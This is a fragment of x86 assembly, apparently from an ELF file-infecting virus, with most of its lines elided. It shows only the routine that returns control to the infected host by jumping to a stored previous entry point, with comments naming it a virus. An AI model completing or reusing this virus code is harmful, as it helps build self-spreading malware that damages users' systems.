...
D: 
	...
	mov esi,660d ;Discovered length, into esi 
...
VirusExit: ;if original exit. else [infected], jmp to previous entry proint. 
	
	mov ebx,0x08048000
	add ebx,eax  ;ebx points to end
	mov ecx,dword [ebx] ;ecx holds the data in the last 4 bytes
	jmp ecx  
...
error: ;If error, exit
	...
	;jmp ecx
 	...
 	call get_my_loc
 	sub ecx,next_i-PreviousEntryPoint ;ecx holds VirusExit
 	mov edx, dword [ecx]
 	jmp edx ;ecx 0x08048080 
...
PreviousEntryPoint: dd 0x08048080 ;0x08048080
